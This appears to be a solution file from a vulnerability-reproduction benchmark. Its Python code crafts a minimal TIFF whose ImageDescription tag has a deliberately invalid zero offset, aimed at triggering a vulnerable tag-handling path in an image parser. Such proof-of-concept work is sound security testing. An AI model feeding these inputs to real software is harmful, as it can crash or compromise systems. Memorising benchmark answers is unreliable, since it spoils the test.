import struct
from typing import ByteString

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal little-endian TIFF with a valid 1x1 grayscale image plus an invalid
        # out-of-line (offline) ASCII tag whose value offset is zero.
        # This aims to trigger the vulnerable offline-tag handling path.
        endian = b"II"
        version = 42
        ifd_offset = 8

        def ifd_entry(tag: int, typ: int, count: int, value_or_offset: int) -> bytes:
            return struct.pack("<HHI", tag, typ, count) + struct.pack("<I", value_or_offset)

        # Tags (sorted ascending)
        # 256 ImageWidth (LONG,1) = 1
        # 257 ImageLength (LONG,1) = 1
        # 258 BitsPerSample (SHORT,1) = 8
        # 259 Compression (SHORT,1) = 1 (none)
        # 262 PhotometricInterpretation (SHORT,1) = 1 (BlackIsZero)
        # 270 ImageDescription (ASCII,8) offset=0  <-- invalid offline tag offset
        # 273 StripOffsets (LONG,1) = pixel_offset
        # 278 RowsPerStrip (LONG,1) = 1
        # 279 StripByteCounts (LONG,1) = 1
        entries = []

        entries.append(ifd_entry(256, 4, 1, 1))
        entries.append(ifd_entry(257, 4, 1, 1))
        entries.append(ifd_entry(258, 3, 1, 8))
        entries.append(ifd_entry(259, 3, 1, 1))
        entries.append(ifd_entry(262, 3, 1, 1))
        entries.append(ifd_entry(270, 2, 8, 0))  # invalid: offline ASCII with value offset 0

        # We'll compute pixel_offset based on final IFD size.
        # Placeholder for StripOffsets
        strip_offsets_index = len(entries)
        entries.append(b"\x00" * 12)

        entries.append(ifd_entry(278, 4, 1, 1))
        entries.append(ifd_entry(279, 4, 1, 1))

        num_entries = len(entries)
        ifd_size = 2 + num_entries * 12 + 4
        pixel_offset = ifd_offset + ifd_size

        entries[strip_offsets_index] = ifd_entry(273, 4, 1, pixel_offset)

        header = endian + struct.pack("<H", version) + struct.pack("<I", ifd_offset)
        ifd = struct.pack("<H", num_entries) + b"".join(entries) + struct.pack("<I", 0)
        pixel_data = b"\x00"

        return header + ifd + pixel_data